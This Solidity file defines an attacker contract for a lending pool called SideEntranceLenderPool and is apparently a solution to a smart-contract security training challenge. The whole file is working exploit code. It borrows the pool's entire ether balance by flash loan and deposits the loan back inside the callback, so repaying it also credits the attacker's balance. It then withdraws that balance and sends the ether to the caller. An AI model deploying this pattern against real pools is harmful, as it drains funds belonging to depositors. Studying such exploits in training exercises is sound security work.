// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

interface SideEntranceLenderPoolInterface {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideEntranceAttacker is IFlashLoanEtherReceiver{
    SideEntranceLenderPoolInterface pool;

    event Attack(address indexed who, uint256 amount);

    constructor (address _pool) {
        pool = SideEntranceLenderPoolInterface(_pool);
    }

    function execute() external payable {

        pool.deposit{value: address(this).balance}();
    }

    function attack() external payable {
        emit Attack(msg.sender, 10);
        pool.flashLoan(address(pool).balance);
    }

    function getMoney() external{
        pool.withdraw();
    }

    function giveMoney() external {
        payable(address(msg.sender)).transfer(address(this).balance);
    }
    receive() external payable{}
}
